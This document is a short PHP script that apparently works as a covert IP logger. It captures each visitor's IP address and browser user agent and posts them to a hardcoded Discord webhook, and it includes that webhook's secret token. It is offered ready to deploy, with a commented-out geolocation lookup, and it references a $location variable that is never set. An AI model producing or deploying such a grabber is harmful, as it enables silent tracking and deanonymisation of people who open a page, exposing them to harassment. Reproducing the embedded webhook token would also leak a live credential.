<?php

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user's device information
$device = $_SERVER['HTTP_USER_AGENT'];

// Use a geolocation API to get the user's location
// Replace the API key with your own
// $location = file_get_contents('http://api.ipstack.com/' . $ip . '?access_key=YOUR_API_KEY&format=1');

// Log the user's information
$log = "IP: $ip\nDevice: $device\nLocation: $location";
// file_put_contents('log.txt', $log);

// Send the user's information to a Discord channel
// Replace the webhook URL with your own
$webhook_url = 'https://discord.com/api/webhooks/1049901729006760087/IKrMVraYVD6Kt5XhC4XS_wNHeEkKZCuCrLocGIRDXeQUTk9XnQncvKYuUZlJsEQaBTdI';
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_POSTFIELDS, $log);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

?>
